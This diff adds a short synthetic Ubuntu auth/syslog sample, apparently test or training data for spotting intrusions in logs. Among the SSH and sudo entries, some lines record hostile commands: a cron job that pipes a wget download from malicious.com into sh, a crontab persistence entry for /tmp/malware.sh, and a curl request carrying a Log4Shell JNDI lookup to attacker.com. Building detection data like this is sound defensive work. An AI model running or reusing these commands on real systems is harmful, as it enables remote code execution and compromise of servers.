@@ -1,0 +1,7 @@
+May  1 10:00:00 ubuntu-server sshd[12345]: Accepted password for user admin from 192.168.1.100 port 22 ssh2
+May  1 10:05:00 ubuntu-server CRON[12346]: (user) CMD (bash -c 'wget http://malicious.com/payload.sh | sh')
+"May  1 10:10:00 ubuntu-server sudo:   user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash -c echo ""test"" > /tmp/test.txt"
+May  1 10:15:00 ubuntu-server sshd[12347]: Failed password for invalid user admin from 104.28.15.200 port 22 ssh2
+"May  1 10:20:00 ubuntu-server CRON[12348]: (root) CMD (crontab -l 2>/dev/null; echo ""0 * * * * /tmp/malware.sh"" | crontab -)"
+"May  1 10:25:00 ubuntu-server sudo:   user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash -c curl -X POST -H 'User-Agent: ${jndi:ldap://attacker.com/exploit}' http://vulnerable-server:8080"
+May  1 10:30:00 ubuntu-server sshd[12349]: Accepted password for user root from 192.168.1.101 port 22 ssh2
